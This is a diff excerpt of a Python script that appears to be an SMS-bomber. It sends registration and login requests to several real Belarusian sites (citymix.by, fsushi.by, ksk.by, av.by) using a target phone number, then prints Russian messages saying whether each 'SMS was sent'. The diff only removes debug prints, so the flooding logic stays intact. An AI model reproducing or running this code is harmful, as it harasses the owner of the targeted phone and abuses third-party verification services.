@@ -297,10 +297,8 @@ else:
 response = requests.post('https://api.citymix.by/auth/register', json={"phone":f"{phone}","password":"123321123Eg","code":"","resend":1}, headers=headers1)
 if response.status_code == 200:
     print(Fore.GREEN + "Смс от citymix отправлено!")
-    print(response.text)
 else:
     print(Fore.RED + "Смс от citymix не отправлено!")
-    print(response.text)
 
 dates = {
     "CSRF": "",
@@ -314,10 +312,8 @@ dates = {
 response = requests.post('https://fsushi.by/?action=auth', data=dates, headers=headers1)
 if response.status_code == 200:
     print(Fore.GREEN + "Смс от fsushi отправлено!")
-    print(response.text)
 else:
     print(Fore.RED + "Смс от fsushi не отправлено!")
-    print(response.text)
 
 
 headers1 = {
@@ -331,10 +327,8 @@ dates = {
 response = requests.post('https://ksk.by/index.php?route=module/login_form/userAutPhone', data=dates, headers=headers1)
 if response.status_code == 200:
     print(Fore.GREEN + "Смс от ksk.by отправлено!")
-    print(response.text)
 else:
     print(Fore.RED + "Смс от ksk.by не отправлено!")
-    print(response.text)
 
 
 response = requests.post('https://api.av.by/auth/phone/sign-up',json={"name":"Иван","password":"123321123Eg","phone":{"country":"1","number":f"{phone[:4]}"},"userEula":{"accepted":"true"}}, headers=headers1)
